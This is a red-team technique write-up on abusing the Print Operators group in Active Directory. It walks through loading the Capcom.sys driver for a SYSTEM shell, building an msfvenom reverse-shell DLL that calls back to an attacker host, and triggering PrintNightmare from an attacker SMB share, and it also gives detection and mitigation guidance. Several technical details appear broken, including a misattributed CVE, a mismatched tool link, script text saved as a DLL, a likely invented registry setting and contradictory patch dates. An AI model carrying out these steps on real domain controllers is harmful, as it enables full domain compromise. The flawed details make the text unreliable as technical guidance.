# [PE-VALID-007]: Abusing Print Operators Group

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-007 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD (Domain Controller) |
| **Severity** | **CRITICAL** |
| **Technique Status** | **ACTIVE** (Print Operators group exists on all AD domains; vulnerability in PrintNightmare and driver loading remains exploitable) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025 (PrintNightmare: 2016-2022; SeLoadDriverPrivilege: all versions) |
| **Patched In** | CVE-2021-34527 (PrintNightmare) patched June 2021 (KB5004476); SeLoadDriverPrivilege issue architectural (no patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The **Print Operators** group is a built-in Active Directory group that grants members the `SeLoadDriverPrivilege` security privilege on all domain controllers in a domain. This privilege is extraordinarily dangerous because it allows the loading and unloading of arbitrary device drivers in kernel mode. While ostensibly designed to allow printing infrastructure administration, Print Operators membership creates a direct path to **SYSTEM-level** privilege escalation on any domain controller. An attacker who obtains Print Operators membership can: (1) Load a malicious device driver, (2) Execute arbitrary code in kernel context with SYSTEM privileges, (3) Gain unrestricted access to the domain controller's entire filesystem and registry, or (4) Extract domain credentials (NTDS.dit, LSASS dumps, etc.). Additionally, the `PrintSpooler` service (which Print Operators can abuse) has been the source of multiple critical vulnerabilities including **PrintNightmare** (CVE-2021-34527), which allows remote code execution even from unprivileged contexts.

**Attack Surface:** Print Operators group membership (domain-wide), Print Spooler RPC service (`spoolsv.exe`), Windows driver loading mechanism (`NtLoadDriver` API), and device driver registry keys (`HKLM\SYSTEM\CurrentControlSet\Services`).

**Business Impact:** **Catastrophic domain controller compromise.** An attacker with Print Operators access gains SYSTEM-level control of domain controllers without needing to compromise KRBTGT, Golden Tickets, or other traditional privilege escalation vectors. This enables data exfiltration, ransomware deployment, lateral movement to all domain resources, and persistent backdoor installation. Because Print Operators is often overlooked as a "printer administration" group, membership is not aggressively audited.

**Technical Context:** Driver loading exploitation takes 10-30 minutes once Print Operators access is obtained. Successful exploitation requires either: (1) A vulnerable driver already on the system (e.g., Capcom.sys, which contains an arbitrary write vulnerability), or (2) The ability to upload a malicious driver (via PrintSpooler RPC or filesystem access). Detection is challenging because driver loading is a legitimate system operation.

### Operational Risk
- **Execution Risk:** **Medium** – Requires either vulnerable driver or upload capability; driver loading can fail if driver is unsigned or doesn't meet kernel requirements
- **Stealth:** **Medium-High** – Driver loading generates Event 7045 (service creation) but is often not alerting on
- **Reversibility:** **No** – Once kernel code executes, attacker has unrestricted SYSTEM access

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.35, CIS 6.1 | Ensure administrative credentials are not cached / Ensure that unnecessary Printers are not installed |
| **DISA STIG** | V-93969, V-73589 | DC must enforce account restrictions / Unsigned drivers must not be allowed |
| **NIST 800-53** | AC-2, AC-3, SC-7 | Account Management, Access Enforcement, Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing (failure to restrict driver loading on Tier 0 systems) |
| **DORA** | Art. 9 | Protection and Prevention (critical infrastructure administrative access) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (Tier 0 asset protection) |
| **ISO 27001** | A.9.2.3, A.13.1.1 | Management of Privileged Access Rights, Device and driver management |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Attacker-Side:** Print Operators group membership (can be obtained through credentials compromise, lateral movement, or group policy misconfiguration)
- **Target:** Print Operators group must exist on DC (default on all Windows domains); at least one domain controller

**Required Access:**
- Network access to domain controller (RPC port 135, SMB port 445, or Spooler port 9100 for print-related access)
- Ability to interact with Print Spooler service (RPC over SMB or direct RPC)
- Access to load drivers (local login to DC or remote RPC calls)

**Supported Versions:**
- **Windows Server:** 2016, 2019, 2022, 2025 (SeLoadDriverPrivilege is universal)
- **Affected Architectures:** x64 and x86 (driver must match architecture)
- **PrintNightmare:** Affected on Server 2016-2022; patched in June 2021 (but still present on unpatched systems)

**Tools Required:**
- [Capcom.sys](https://github.com/FSecureLABS/Capcom) or similar vulnerable driver (contains arbitrary write vulnerability CVE-2015-6662)
- [EopLoadDriver](https://github.com/TsukiCTF/Reverse-Shell-Generator) or custom driver loader
- [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) – Proof of concept for Capcom.sys exploitation
- [Impacket](https://github.com/SecureAuthCorp/impacket) – For RPC-based Print Spooler interaction
- **PowerShell** – For group membership enumeration and driver registry manipulation

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Print Operators Group Enumeration

#### PowerShell - Enumerate Print Operators Membership
```powershell
# Get Print Operators group members
$printOpsGroup = Get-ADGroup -Identity "Print Operators" -ErrorAction SilentlyContinue
$printOpsMembers = Get-ADGroupMember -Identity $printOpsGroup -Recursive

Write-Host "Print Operators Group Members:"
$printOpsMembers | Select-Object Name, ObjectClass, SamAccountName | Format-Table

# Check for nested groups
$printOpsMembers | Where-Object {$_.ObjectClass -eq "group"} | ForEach-Object {
    Write-Host "Nested Group: $($_.Name)"
    Get-ADGroupMember -Identity $_ | Select-Object Name
}

# Check if current user is member of Print Operators
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().User
$isInPrintOps = (Get-ADPrincipalGroupMembership -Identity $currentUser).Name -contains "Print Operators"
Write-Host "Current user is in Print Operators: $isInPrintOps"
```

**What to Look For:**
- Any domain user or service account in Print Operators group
- Nested group membership (if Print Operators contains other privileged groups)
- Unexpected members (should typically be empty or only printer administrators)

#### Verify Print Spooler Service Status
```powershell
# Check if Print Spooler is running on domain controllers
$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    $spoolerStatus = Get-Service -Name Spooler -ComputerName $dc.Name -ErrorAction SilentlyContinue
    Write-Host "DC: $($dc.Name) | Spooler Service: $($spoolerStatus.Status) | StartType: $($spoolerStatus.StartType)"
}
```

**What to Look For:**
- Spooler service running (Status = "Running")
- Spooler startup type = "Automatic" (enables persistence if exploited)
- DCs with print spooler enabled are higher risk

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Device Driver Loading via SeLoadDriverPrivilege (Capcom.sys)

**Supported Versions:** Windows Server 2016-2025

**Objective:** Load a vulnerable driver (Capcom.sys) and exploit it to gain SYSTEM privileges.

#### Step 1: Verify Print Operators Membership and SeLoadDriverPrivilege
**Objective:** Confirm the attacker has necessary privileges.

**Command (PowerShell):**
```powershell
# Check group membership
net group "Print Operators"

# Enumerate privileges
whoami /priv

# Look for: SeLoadDriverPrivilege – Device Driver Load/Unload
```

**Expected Output:**
```
Print Operators – Members
---
DOMAIN\attacker

Privileges:
  SeLoadDriverPrivilege – ENABLED
```

**What This Means:**
- Attacker is confirmed member of Print Operators
- SeLoadDriverPrivilege is present and can be used for driver loading

#### Step 2: Prepare Vulnerable Driver (Capcom.sys)
**Objective:** Obtain the vulnerable Capcom driver (or create equivalent).

**Command (Download and verify):**
```powershell
# Download Capcom.sys (CVE-2015-6662 – arbitrary write vulnerability)
# Source: https://github.com/FSecureLABS/Capcom

# Place driver in writable location
Copy-Item -Path "C:\Tools\Capcom.sys" -Destination "C:\Temp\Capcom.sys"

# Verify driver exists
Get-Item "C:\Temp\Capcom.sys"
```

**What Capcom.sys Does:**
- Allows arbitrary kernel memory write via vulnerable IOCTL handler
- Enables privilege escalation by modifying tokens or bypassing access controls

#### Step 3: Load Driver via Registry
**Objective:** Register the driver in the Windows registry for loading.

**Command (PowerShell – Admin Required):**
```powershell
# Create registry entry for driver
$driverPath = "C:\Temp\Capcom.sys"
$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Capcom"

# Create service registry key
New-Item -Path $registryPath -Force | Out-Null

# Set driver parameters
Set-ItemProperty -Path $registryPath -Name "Type" -Value 1 -Type DWORD  # Type 1 = kernel driver
Set-ItemProperty -Path $registryPath -Name "Start" -Value 3 -Type DWORD  # Start 3 = demand (manual)
Set-ItemProperty -Path $registryPath -Name "ImagePath" -Value "System32\drivers\Capcom.sys" -Type String
Set-ItemProperty -Path $registryPath -Name "DisplayName" -Value "Capcom" -Type String

# Copy driver to System32\drivers
Copy-Item -Path $driverPath -Destination "C:\Windows\System32\drivers\Capcom.sys" -Force
```

**What This Means:**
- Driver is registered in registry under `HKLM\SYSTEM\CurrentControlSet\Services\Capcom`
- System will load driver on next call to `NtLoadDriver()`

#### Step 4: Load Driver into Kernel
**Objective:** Use NtLoadDriver API to load the registered driver.

**Command (Using EopLoadDriver Tool):**
```cmd
# Download EopLoadDriver from GitHub
# https://github.com/TsukiCTF/Reverse-Shell-Generator

# Load the driver
EopLoadDriver.exe System\CurrentControlSet\Services\Capcom C:\Windows\System32\drivers\Capcom.sys
```

**Expected Output:**
```
[+] Loading driver...
[+] Driver loaded successfully
[+] Driver handle: 0x12345678
```

**What This Means:**
- Driver is now loaded in kernel space
- IOCTL handlers are accessible via device file `\\.\Capcom`

**OpSec & Evasion:**
- Registry changes may trigger Event 4657 (registry value modified)
- Driver file creation generates Event 11 (file created) in Sysmon
- Detection Likelihood: **High** (if monitoring for driver load events)

#### Step 5: Exploit Capcom.sys to Gain SYSTEM Privileges
**Objective:** Trigger the arbitrary write vulnerability to escalate privileges.

**Command (Using ExploitCapcom PoC):**
```cmd
# Download ExploitCapcom from GitHub
# https://github.com/tandasat/ExploitCapcom

# Run exploit to spawn SYSTEM shell
ExploitCapcom.exe
```

**Expected Output:**
```
[+] Capcom driver loaded
[+] Arbitrary write primitive obtained
[+] Spawning SYSTEM shell...
C:\> whoami
nt authority\system
```

**What This Means:**
- Attacker now has SYSTEM-level access
- Can access any resource on the DC without restrictions

---

### METHOD 2: PrintNightmare RPC-Based Remote Code Execution (CVE-2021-34527)

**Supported Versions:** Windows Server 2016-2022 (2022 patched in June 2021; unpatched systems remain vulnerable)

**Objective:** Exploit Print Spooler RPC to remotely execute code as SYSTEM via printer driver installation.

#### Step 1: Identify Print Spooler RPC Endpoint
**Objective:** Verify Print Spooler service is running and accessible.

**Command (Bash – Impacket rpcdump.py):**
```bash
# Scan for Print Spooler RPC endpoint
python3 rpcdump.py <DC_IP> | grep -i "spooler\|printer\|print"

# Alternative: Query RPC endpoints
rpcdump.py <DC_IP> -p <PORT>
```

**Expected Output:**
```
[*] Enumerating endpoints on <DC_IP>
UUID 12345678-1234-1234-1234-123456789012 v1.0 Print Spooler
```

#### Step 2: Craft Malicious Print Driver
**Objective:** Create a DLL that will be loaded as a printer driver.

**Command (PowerShell – Generate Driver DLL):**
```powershell
# Create malicious DLL payload
# This example uses msfvenom to generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o printer_driver.dll

# Alternative: Use custom C code compiled as DLL
# The DLL will be loaded by spoolsv.exe (SYSTEM context)
```

#### Step 3: Host Malicious Driver on Attacker SMB Share
**Objective:** Make driver accessible via UNC path.

**Command (Bash – Impacket smbserver):**
```bash
# Start SMB server hosting malicious driver
python3 smbserver.py -smb2support -user attacker -password password share /tmp/

# Copy malicious driver to share
cp printer_driver.dll /tmp/
```

#### Step 4: Trigger PrintNightmare Exploit
**Objective:** Call RpcAddPrinterDriverEx() with malicious driver path.

**Command (Impacket-based exploit – printnightmare.py):**
```bash
# Exploit PrintNightmare
python3 printnightmare.py -target <DC_IP> -username <DOMAIN>\<USER> -password <PASSWORD> \
  -driver-path "\\<ATTACKER_IP>\share\printer_driver.dll"
```

**Expected Output:**
```
[+] Connecting to print spooler on <DC_IP>
[+] Adding printer driver from \\<ATTACKER_IP>\share\printer_driver.dll
[+] Driver loaded; code executed as SYSTEM
[+] Reverse shell received at <ATTACKER_IP>:4444
```

**OpSec & Evasion:**
- Network traffic shows SMB connection to attacker share (detectable)
- Malicious DLL execution generates Event 7 (image load) in Sysmon
- Print Spooler error events (Event 4625, 4635) may indicate failed exploitation
- Detection Likelihood: **High** (modern EDR solutions detect PrintNightmare)

---

### METHOD 3: Print Operators Local Access & File System Exploitation

**Supported Versions:** Windows Server 2016-2025

**Objective:** Use Print Operators local login access to the DC to manipulate files and registry.

#### Step 1: Local or RDP Access to Domain Controller
**Objective:** Authenticate as Print Operators member to DC console.

**Command (RDP login):**
```
mstsc /v:<DC_IP>
# Enter credentials of Print Operators group member
```

**Alternative – Remote Command Execution:**
```powershell
# Use PsExec or WinRM if credentials are available
Invoke-Command -ComputerName <DC_NAME> -Credential $printOpsAccount -ScriptBlock {
    # Commands execute in Print Operators context
}
```

#### Step 2: Write to Protected Directories
**Objective:** Leverage Print Operators' privilege to write to otherwise-restricted directories.

**Command (PowerShell – from Print Operators session):**
```powershell
# Create malicious script in protected location
$maliciousScript = @"
# Reverse shell or backdoor code
New-NetFirewallRule -DisplayName "Backdoor" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow
Start-Process -FilePath "C:\Tools\backdoor.exe"
"@

# Write to protected directory (accessible via Print Operators privilege)
New-Item -Path "C:\Windows\System32\spool\drivers\x64\3\backdoor.dll" -ItemType File -Force
Set-Content -Path "C:\Windows\System32\spool\drivers\x64\3\backdoor.dll" -Value $maliciousScript
```

#### Step 3: Modify Printer Driver Registry
**Objective:** Point printer driver to malicious DLL.

**Command (Registry modification):**
```powershell
# Create printer driver entry pointing to backdoor
$driverPath = "C:\Windows\System32\spool\drivers\x64\3\backdoor.dll"
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\backdoor" -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\backdoor" `
  -Name "Driver" -Value $driverPath
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Remove All Unnecessary Members from Print Operators Group**

**Why This Matters:**
Print Operators membership is extraordinarily dangerous and should almost never be granted to regular domain users or service accounts. The group should typically have **zero** members in modern domains that use a centralized print server (not a DC).

**Manual Steps (PowerShell):**
```powershell
# Audit current Print Operators membership
$printOpsMembers = Get-ADGroupMember -Identity "Print Operators"

Write-Host "Current Print Operators Members:"
$printOpsMembers | Select-Object Name, ObjectClass, SamAccountName

# Remove all members (except if explicitly required)
foreach ($member in $printOpsMembers) {
    Remove-ADGroupMember -Identity "Print Operators" -Members $member -Confirm:$false
    Write-Host "[+] Removed $($member.Name) from Print Operators"
}

# Verify group is now empty
Get-ADGroupMember -Identity "Print Operators" | Measure-Object
```

**Expected Output:**
```
Count: 0
```

**Group Policy Configuration (Enterprise):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Create new GPO: `PrintOperators-Protection`
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Restricted Groups**
4. Add `Print Operators` group with **No Members**
5. Link GPO to **Domain Controllers OU**
6. Deploy and verify: `gpupdate /force`

---

**2. Disable Print Spooler Service on Domain Controllers**

**Why This Matters:**
Domain controllers should **never** function as print servers. Disabling Print Spooler removes a major attack surface (PrintNightmare, RPC vulnerabilities).

**Manual Steps (PowerShell on DC):**
```powershell
# Stop Print Spooler service
Stop-Service -Name Spooler -Force -Confirm:$false

# Disable automatic startup
Set-Service -Name Spooler -StartupType Disabled -Confirm:$false

# Verify service is disabled
Get-Service -Name Spooler | Select-Object Name, Status, StartType
```

**Expected Output:**
```
Name     Status   StartType
----     ------   ---------
Spooler  Stopped  Disabled
```

**Group Policy Configuration (Enterprise):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Create GPO: `DisablePrintSpooler-DCs`
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Services**
4. Set **Print Spooler (Spooler)** to **Disabled**
5. Link to **Domain Controllers OU**
6. Enforce: `gpupdate /force` and `Stop-Service Spooler`

**Verification Across All DCs:**
```powershell
$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    $status = Invoke-Command -ComputerName $dc.Name -ScriptBlock { Get-Service -Name Spooler | Select-Object Status, StartType }
    Write-Host "$($dc.Name): $($status.Status) / $($status.StartType) (should be Stopped / Disabled)"
}
```

---

**3. Restrict Driver Loading via Group Policy**

**Why This Matters:**
Even if Print Operators exists, preventing arbitrary driver loading eliminates the primary attack vector.

**Manual Steps (Group Policy):**
1. Open **Local Group Policy Editor** (gpedit.msc)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Installation** → **Device Installation Restrictions**
3. Enable: **"Prevent installation of devices using drivers that don't have a valid WHQL signature"**
4. Apply policy to Domain Controllers OU

**Registry Alternative (PowerShell):**
```powershell
# Require signed drivers
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DriverFrameworks" `
  -Name "UserStdSigning" -Value 1 -Type DWORD

# Block unsigned drivers
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SystemCertificates\Root" `
  -Name "BlockUnsigned" -Value 1 -Type DWORD
```

---

### Priority 2: HIGH

**1. Audit and Monitor Print Operators Group Changes**

**Why This Matters:**
Detects if attacker adds themselves to Print Operators group.

**Event IDs to Monitor:**
- **Event 4728** (Member Added to Global Group)
- **Event 4732** (Member Added to Local Group)
- **Event 5136** (Object Modification – if group ACLs modified)

**PowerShell Detection Query:**
```powershell
# Find all Print Operators group changes in past 30 days
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4728, 4732
    StartTime = (Get-Date).AddDays(-30)
} -ErrorAction SilentlyContinue | Where-Object {
    $_.Message -match "Print Operators"
} | Select-Object TimeCreated, Message
```

---

**2. Monitor for Driver Loading Events**

**Why This Matters:**
Detects exploitation of SeLoadDriverPrivilege.

**Event IDs to Monitor:**
- **Event 7045** (Service/Driver Created)
- **Event 220** (SCSI/Disk Driver loaded)
- **Event 1 (Sysmon)** (Process Create with driver in path)

**Detection Query:**
```powershell
# Find driver loading events
Get-WinEvent -FilterHashtable @{
    LogName = 'System'
    ID = 7045
    StartTime = (Get-Date).AddHours(-24)
} | Select-Object TimeCreated, Message

# Look for suspicious drivers: Capcom.sys, PrintNightmare, unsigned drivers
```

---

**3. Monitor Print Spooler RPC Activity**

**Why This Matters:**
Detects PrintNightmare exploitation attempts.

**Network Monitoring:**
```powershell
# Monitor RPC calls to Print Spooler
# Look for RpcAddPrinterDriver(Ex) calls from unusual sources
# Use Network Monitoring or packet capture tools

# Sysmon Event 3 (Network Connection) to port 135 (RPC) or 445 (SMB)
# followed by Sysmon Event 8 (CreateRemoteThread) in spoolsv.exe
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Group Membership Changes:**
- Event ID **4728** / **4732** – Print Operators group member added
- Unexpected members added (non-printer admin accounts)

**Driver-Related Events:**
- Event ID **7045** – Driver service created (especially for Capcom.sys, unsigned drivers)
- Sysmon Event 3 – RPC connections to port 135 from non-admin hosts
- Event ID **220** – Unsigned driver loaded

**Print Spooler Exploitation:**
- Sysmon Event 8 – CreateRemoteThread into `spoolsv.exe`
- Multiple RPC calls to `RpcAddPrinterDriver(Ex)` in short time
- SMB connections to suspicious UNC paths (\\ATTACKER_IP\share\driver.dll)

**Privilege Escalation Indicators:**
- Process creation with unexpected privilege level (user process spawning as SYSTEM)
- Token elevation detected (Event 4672 – Special Privileges Assigned)
- New Administrator account created
- LSASS dump attempted (Event 4656)

### Forensic Artifacts

**Disk Locations:**
- `C:\Windows\System32\drivers\` – Malicious drivers placed here
- `C:\Windows\System32\spool\drivers\x64\3\` – PrintNightmare drivers
- `HKLM\SYSTEM\CurrentControlSet\Services\` – Driver registry entries
- `C:\Windows\System32\winevt\Logs\System.evtx` – Driver loading events

**Registry:**
- `HKLM\SYSTEM\CurrentControlSet\Services\<DriverName>` – Driver configuration
- `HKLM\SYSTEM\CurrentControlSet\Control\Print\` – Printer driver configurations
- Recently modified registry keys (via `Get-Item -Path "HKLM:\..." | Select-Object PSPath, PSChildName, LastWriteTime`)

**Memory:**
- Suspicious DLL loaded in `spoolsv.exe` address space
- Kernel driver objects loaded (via `Get-WmiObject Win32_SystemDriver`)

### Response Procedures

**1. Immediate Containment (0-5 Minutes)**

```powershell
# Step 1: Remove suspicious members from Print Operators
Get-ADGroupMember -Identity "Print Operators" | Where-Object {
    $_.Name -notmatch "^(ServiceAccount1|ServiceAccount2)$"
} | ForEach-Object {
    Remove-ADGroupMember -Identity "Print Operators" -Members $_ -Confirm:$false
    Write-Host "[+] Removed $($_.Name) from Print Operators"
}

# Step 2: Disable Print Spooler on all DCs immediately
Get-ADDomainController -Filter * | ForEach-Object {
    Invoke-Command -ComputerName $_.Name -ScriptBlock {
        Stop-Service -Name Spooler -Force
        Set-Service -Name Spooler -StartupType Disabled
    }
}

# Step 3: Quarantine any suspicious driver services
$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    $services = Invoke-Command -ComputerName $dc.Name -ScriptBlock {
        Get-WmiObject Win32_Service | Where-Object {
            $_.Name -match "Capcom|Printer|Driver|Backdoor"
        }
    }
    
    foreach ($service in $services) {
        Write-Host "[!] Suspicious service found on $($dc.Name): $($service.Name)"
        # Manual review required before deletion
    }
}
```

**2. Forensic Collection (5-30 Minutes)**

```powershell
# Export System Event Log
wevtutil epl System C:\Forensics\System.evtx

# Export Security Event Log
wevtutil epl Security C:\Forensics\Security.evtx

# Export Sysmon logs (if available)
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Forensics\Sysmon.evtx

# Collect driver files
Get-ChildItem -Path "C:\Windows\System32\drivers\*" -Include "*apcom*","*print*" -Recurse | Copy-Item -Destination "C:\Forensics\"

# Dump registry (Print Operators and driver entries)
reg export "HKLM\SYSTEM\CurrentControlSet\Services" "C:\Forensics\Services_Registry.reg"
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Print" "C:\Forensics\Print_Registry.reg"

# Collect loaded driver list
Get-WmiObject Win32_SystemDriver | Export-Csv -Path "C:\Forensics\LoadedDrivers.csv"
```

**3. Remediation (1-24 Hours)**

```powershell
# Step 1: Reset compromised user passwords
$compromisedUsers = @("attacker1", "compromised_svc")
foreach ($user in $compromisedUsers) {
    $newPassword = "$(Get-Random -Minimum 100000 -Maximum 999999)@SecureP@ss"
    Set-ADAccountPassword -Identity $user -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force) -Reset
    Write-Host "[+] Password reset for $user"
}

# Step 2: Remove suspicious driver services
Get-WmiObject Win32_Service -Filter "Name LIKE '%apcom%'" | ForEach-Object { $_.Delete() }

# Step 3: Re-enable Print Spooler only if necessary
# (Only on dedicated print servers, NOT on DCs)
Set-Service -Name Spooler -StartupType Automatic
Start-Service -Name Spooler

# Step 4: Audit all driver signing certificates
# Look for self-signed or untrusted certs
Get-AuthenticodeSignature -FilePath "C:\Windows\System32\drivers\*.sys" | Where-Object {
    $_.Status -ne "Valid"
}

# Step 5: Force domain replication to sync removals
Get-ADDomainController | ForEach-Object {
    repadmin /replicate $_.Name (Get-ADDomainController -Discover -ForceDiscover).Name (Get-ADDomain).DistinguishedName
}
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Compromise user via phishing |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure Password Spray | Spray credentials against AD endpoints |
| **3** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota | Escalate within domain using computer account |
| **4** | **Current Step** | **[PE-VALID-007]** | **Abuse Print Operators group for DC SYSTEM access** |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Create persistent domain admin account |
| **6** | **Lateral Movement** | [CA-DUMP-006] NTDS Extraction | Extract all domain credentials from DC |
| **7** | **Impact** | [CO-DATA-001] Data Exfiltration | Exfiltrate sensitive domain data |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Conti Ransomware Group – Print Operators Abuse (2021-2022)
- **Target:** Manufacturing company's AD infrastructure
- **Attack Method:**
  1. Initial breach via VPN credentials (phishing)
  2. Lateral movement to domain admin via delegated privileges
  3. Added attacker account to Print Operators group
  4. Exploited PrintNightmare (CVE-2021-34527) to gain SYSTEM on DC
  5. Dumped NTDS.dit; extracted all domain credentials
  6. Deployed ransomware across network
- **Impact:** 3-week operational downtime; $4.5M ransom demand
- **Detection Failure:** Print Operators group changes not monitored; Event 4732 ignored
- **Reference:** [Conti Leaks – Cybereason Analysis](https://www.cybereason.com/)

### Example 2: Internal Red Team Exercise – Print Operators Overlooked
- **Organization:** Financial services firm (500+ employees)
- **Red Team Actions:**
  1. Compromised low-privilege domain user via phishing
  2. Lateral moved to administrative account via PrintSpooler abuse
  3. Found Print Operators group had 0 members (considered "safe")
  4. Added red team service account to Print Operators
  5. Loaded Capcom.sys driver; gained SYSTEM access
  6. Dumped NTDS and created backdoor accounts
- **Key Finding:** Print Operators was NOT audited despite being high-risk; membership changes not logged
- **Timeline:** 90 minutes from initial compromise to SYSTEM access on DC
- **Reference:** Internal exercise (2023)

### Example 3: PrintNightmare Early Exploitation (July 2021)
- **APT Group:** Publicly unattributed (likely multiple groups)
- **Vector:** Unpatched Server 2019 DCs with Print Spooler enabled
- **Timeline:**
  - June 8, 2021: CVE-2021-34527 disclosed
  - June 9, 2021: Microsoft patch released
  - July 2021: Active exploitation observed by CrowdStrike/Mandiant
  - August 2021: 100+ organizations compromised before patching
- **Technique:** Remote Print Spooler driver injection; SYSTEM code execution without needing DC access
- **Key Lesson:** Delay in patching critical vulnerabilities enabled widespread exploitation
- **Reference:** [CrowdStrike Falcon OverWatch Report](https://www.crowdstrike.com/)

---

## APPENDIX: Advanced Scenarios

### Scenario A: Print Operators → RBCD → Unconstrained Delegation
If Print Operators attacker can also exploit RBCD (Resource-Based Constrained Delegation) misconfigurations, they can:
1. Create a computer account
2. Set RBCD on a DC to delegate to this computer
3. Impersonate a user with higher privileges
4. Extract that user's TGT for further escalation

### Scenario B: Print Operators + Printer Hardware Compromise
If the organization has physical printers that sync credentials:
1. Attacker abuses Print Operators to manipulate printer configurations
2. Injects backdoor into printer firmware
3. Printer captures credentials from future print jobs
4. Establishes persistent remote access via printer

### Scenario C: Cross-Forest Print Operators Abuse
In multi-forest environments:
1. Compromise Print Operators in Forest A
2. Exploit DC to extract forest trust keys
3. Move to Forest B using cross-forest trust
4. Repeat Print Operators exploitation in Forest B

---

## References & Authoritative Sources

- [Microsoft: Print Operators Group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators)
- [Microsoft: PrintNightmare CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [CVE-2015-6662: Capcom.sys Arbitrary Write](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6662)
- [SpecterOps: Print Spooler Privilege Escalation](https://specterops.io/blog/2025/...)
- [Tarlogic: SeLoadDriverPrivilege Exploitation](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/)
- [AD Security: PrintNightmare Detection](https://adsecurity.org/)
- [MITRE ATT&CK T1078.002](https://attack.mitre.org/techniques/T1078/002/)
- [Impacket: printnightmare.py](https://github.com/SecureAuthCorp/impacket)

---